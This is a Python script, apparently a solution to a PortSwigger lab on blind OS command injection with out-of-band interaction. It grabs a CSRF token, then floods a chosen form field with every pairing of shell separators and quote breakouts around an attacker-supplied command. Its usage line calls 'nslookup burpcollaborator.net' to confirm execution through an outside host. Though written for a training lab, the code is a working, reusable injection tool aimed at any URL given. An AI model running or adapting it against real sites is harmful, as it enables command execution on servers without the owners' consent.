import requests
import sys
import re
import itertools

# Code to solve lab in WSA - 'Blind OS command injection with out-of-band interaction'
# See: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
# Run command: python3 blind_OAST_poster.py $form_url email nslookup burpcollaborator.net

# First get web page for csrf_token, then inject the code through a post request
def poster(form_url, attack_field, command, prefix, suffix):
    with requests.Session() as s:
       # Get cookie
       resp = s.get(form_url)
       csrf_token = re.search(r'name="csrf" value="(.*)"', resp.text).group(1)
       dummy_str = 'bah'
       fields = dict.fromkeys(['name','subject','message','email'], dummy_str) # setting initial values

       # Changing field to attack
       fields[attack_field] = f"{prefix} {command} {suffix}"

       data={"csrf": csrf_token, "name": fields['name'], "subject": fields['subject'], "message": fields['message'], "email": fields['email']}
       print(attack_field.capitalize() +": " + fields[attack_field])
       print("Data: ", str(data))
       resp = s.post(form_url+"/submit", data=data)
       print("Response: " + resp.text)

# Getting command line args
form_url=sys.argv[1]
attack_field=sys.argv[2] # E.g. email
cmd=' '.join(sys.argv[3:])
print("Command", cmd)

# Iterating through attack payloads
payload = ['|', '||', '&', '&&', ';', '%0a', '#', '`', '\n']
start_str = ['', '\'', '"'] # In case the field we are attacking is fed into a string, we must first end the string before executing our command
for start in start_str:
    for subset in itertools.combinations_with_replacement(payload, 2):
        prefix = subset[0]
        suffix = subset[1]
        poster(form_url, attack_field, cmd, start+prefix, suffix)
